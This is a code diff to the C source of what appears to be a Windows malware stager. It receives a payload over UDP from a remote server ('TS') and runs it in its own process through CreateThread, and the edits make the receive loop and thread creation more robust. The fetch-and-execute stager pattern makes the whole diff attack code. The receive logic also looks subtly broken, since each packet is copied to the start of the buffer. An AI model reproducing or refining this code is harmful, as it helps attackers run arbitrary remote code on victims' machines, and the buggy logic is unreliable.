@@ -293,7 +293,7 @@ int sendData(SOCKET sd, const char* data, DWORD len, SOCKADDR_IN SrvAddr, int re
 */
 DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int retries) {
 	debug_print("%s", "Receiving Data\n");
-	DWORD size = 0, temp = 0, seqnum = 0;
+	DWORD size = 0, total = 0, temp = 0, seqnum = 0;
 	int iResult = 0;
 	int SrvAddrSize = sizeof(SrvAddr);
 	int _retries = retries;
@@ -350,7 +350,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int ret
 		return(-1);
 	}
 
-	debug_print("Size: 0x%08x\n", size);
+	debug_print("Size: %d\n", size);
 
 	char* packet = calloc(PACKET_SIZE+4, 1);
 	if (packet == NULL)
@@ -364,7 +364,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int ret
 	/* read in the data */
 	//TODO: Double check the logic here to make sure we can recv everything we need to.
 	// Old note said "No danger of reading more than a single packet, as UDP sockets store disjoint datagrams."
-	while (_retries > 0) {
+	while (_retries > 0 && total < size) {
 		temp = recvfrom(sd, packet, PACKET_SIZE+4, 0, (SOCKADDR *)& SrvAddr, &SrvAddrSize);
 		if (temp == SOCKET_ERROR)
 		{
@@ -395,6 +395,7 @@ DWORD recvData(SOCKET sd, char * buffer, DWORD max, SOCKADDR_IN SrvAddr, int ret
 			{
 				server_seqnum++;
 				memcpy((buffer), (packet + 4), temp - 4);
+				total += temp - 4;
 				break;
 			}
 			else
@@ -605,7 +606,12 @@ void main(int argc, char* argv[])
 	}
 	debug_print("Recv %d byte payload from TS\n", payload_size);
 	/* inject the payload stage into the current process */
-	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
+	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID) NULL, 0, NULL);
+	if (hThread == NULL)
+	{
+		debug_print("%s", "CreateThread failed\n");
+		exit(1);
+	}
 
 	debug_print("%s", "Thread Created, payload received intact\n");
 
